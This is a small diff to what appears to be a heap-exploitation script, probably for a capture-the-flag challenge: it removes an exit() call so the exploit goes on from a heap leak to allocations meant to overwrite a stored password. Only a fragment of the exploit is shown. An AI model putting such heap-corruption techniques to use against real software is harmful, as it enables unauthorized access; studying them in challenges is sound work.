@@ -128,7 +128,6 @@ payload += p64(addr_pass)
 fn_leave(0, 0x80, payload)
 
 fn_leak(base_heap, 0x80, "heap [0x603000]")
-exit()
 
 fn_leave(1, 0x20, "D"*8)
 fn_leave(0, 0x20, "E"*8) # will place on password
